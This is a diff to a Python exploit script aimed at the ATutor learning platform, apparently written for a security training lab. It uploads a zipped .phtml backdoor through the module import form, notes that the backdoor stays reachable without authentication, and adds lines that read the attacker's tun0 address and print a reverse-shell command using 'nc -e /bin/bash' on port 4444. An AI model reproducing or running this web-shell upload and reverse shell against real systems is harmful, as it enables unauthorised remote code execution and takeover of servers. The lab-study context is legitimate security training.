@@ -3,6 +3,7 @@ from mysqli_template_async import get_string
 from mysqli_template_async import get_length
 import hashlib
 import requests
+import netifaces as ni
 import zipfile
 from io import BytesIO
 try:
@@ -57,15 +58,16 @@ def upload_backdoor(session:requests.sessions.Session, filename:str):
             "file":(full_filename,fileobj, 'application/x-zip-compressed'),
             },
         data={"submit_import": "Import"},
-        #proxies=proxies,
     )
     #print (res.status_code)
-    # NOTICE THAT WE DO NOT USE THE SESSION ON PURPOSE, our backdoor should be reachable from an unauthenticated user.
+    # NOTICE THAT WE DO NOT USE THE SESSION ON PURPOSE, our backdoor should be reachable from an unauthenticated use context.
     backdoor_url = F"http://atutor/ATutor/mods/{filename}/{filename}.phtml"
     res = requests.get(backdoor_url)
     if (res.status_code == 200):
         print("(+) Backdoor Upload successfull")
         print(F"(+) Backdoor can be found at: {backdoor_url}")
+        attacker_ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
+        print(F"(+) Reverse shell => curl {backdoor_url}?cmd=nc%20-e%20%2Fbin%2Fbash%20{attacker_ip}%204444")
     else:
         print("(+) Backdoor Upload Failed")
 async def main():
